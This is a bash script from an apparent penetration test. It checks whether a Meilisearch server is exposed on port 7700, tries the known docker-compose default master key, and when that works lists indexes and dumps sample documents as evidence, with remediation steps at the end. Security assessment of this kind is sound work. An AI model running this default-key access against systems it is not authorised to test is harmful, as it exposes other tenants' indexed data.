#!/usr/bin/env bash
# F17 — Meilisearch Network Exposure + Default Key Test
#
# Finding: Meilisearch port 7700 is accessible from the network.
# If MEILISEARCH_MASTER_KEY was not changed from the docker-compose default
# ('meilisearch-dev-key'), all indexed data across all tenants is readable
# with a known credential.
#
# Expected (secure): Port 7700 not reachable, or non-default key required
# Expected (insecure): 200 with default key, or port unreachable without auth
#
# CVSS v3: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N (8.5 High) if default key
#          AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N (0.0) if key is non-default

set -uo pipefail

TARGET="${TARGET:-10.0.63.14}"
MEILI_PORT="${MEILI_PORT:-7700}"
MEILI_URL="http://$TARGET:$MEILI_PORT"
EVIDENCE_FILE="${EVIDENCE_FILE:-$(dirname "$0")/../evidence/F17-meilisearch-exposure.txt}"
DEFAULT_KEY="meilisearch-dev-key"

mkdir -p "$(dirname "$EVIDENCE_FILE")"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

{
echo "================================================================"
echo " F17: Meilisearch Network Exposure"
echo " Target: $MEILI_URL"
echo " Timestamp: $TIMESTAMP"
echo "================================================================"
echo ""

# ---- Test 1: Is the port reachable at all? ----
echo "--- Test 1: Port reachability ---"
HEALTH=$(curl -s --max-time 5 "$MEILI_URL/health" -w "\nHTTP:%{http_code}" 2>&1)
HTTP_CODE=$(echo "$HEALTH" | grep "HTTP:" | cut -d: -f2)
BODY=$(echo "$HEALTH" | grep -v "HTTP:")

echo "Command: curl -s $MEILI_URL/health"
echo "Response: $BODY"
echo "HTTP: $HTTP_CODE"

if [[ "$HTTP_CODE" == "200" ]]; then
  echo ""
  echo "RESULT: CONFIRMED — Meilisearch is NETWORK-ACCESSIBLE on port $MEILI_PORT"
  echo "IMPACT: Any host that can reach $TARGET:$MEILI_PORT can attempt to authenticate"
  echo "        Meilisearch should be bound to localhost or protected by firewall"
  REACHABLE=true
else
  echo "RESULT: PASS — Port $MEILI_PORT not reachable from this host"
  REACHABLE=false
fi

echo ""

# ---- Test 2: Default key access ----
echo "--- Test 2: Default master key ('$DEFAULT_KEY') ---"
INDEXES=$(curl -s --max-time 5 "$MEILI_URL/indexes" \
  -H "Authorization: Bearer $DEFAULT_KEY" \
  -w "\nHTTP:%{http_code}" 2>&1)
HTTP_CODE=$(echo "$INDEXES" | grep "HTTP:" | cut -d: -f2)
BODY=$(echo "$INDEXES" | grep -v "HTTP:")

echo "Command: curl -s $MEILI_URL/indexes -H 'Authorization: Bearer $DEFAULT_KEY'"
echo "Response: $BODY"
echo "HTTP: $HTTP_CODE"

if echo "$BODY" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if 'results' in d else 1)" 2>/dev/null; then
  echo ""
  echo "RESULT: CRITICAL — Default key accepted! All index data readable."
  echo ""
  echo "--- Listing indexes ---"
  echo "$BODY" | python3 -m json.tool 2>/dev/null
  echo ""
  echo "--- Attempting document dump from first index ---"
  FIRST_INDEX=$(echo "$BODY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['results'][0]['uid'])" 2>/dev/null)
  if [[ -n "$FIRST_INDEX" ]]; then
    echo "First index: $FIRST_INDEX"
    curl -s --max-time 5 "$MEILI_URL/indexes/$FIRST_INDEX/documents?limit=3" \
      -H "Authorization: Bearer $DEFAULT_KEY" | python3 -m json.tool 2>/dev/null
  fi
else
  echo ""
  echo "RESULT: PARTIAL — Port is open but default key rejected (custom key set)"
  echo "IMPACT: Port 7700 is still publicly accessible — should be firewalled"
  echo "        Brute-forcing or credential leaks could still expose all indexed data"
fi

echo ""
echo "--- Summary ---"
echo "Port accessible: $REACHABLE"
echo "Default key works: $(echo "$HTTP_CODE" | grep -q "200" && echo "YES - CRITICAL" || echo "No")"
echo ""
echo "Remediation:"
echo "  1. Firewall port 7700 — never expose Meilisearch to the network"
echo "  2. Set a strong random MEILISEARCH_MASTER_KEY in .env"
echo "  3. docker-compose.yml default is 'meilisearch-dev-key' — change it"
echo "================================================================"
} | tee "$EVIDENCE_FILE"

echo ""
echo "[+] Evidence saved to: $EVIDENCE_FILE"
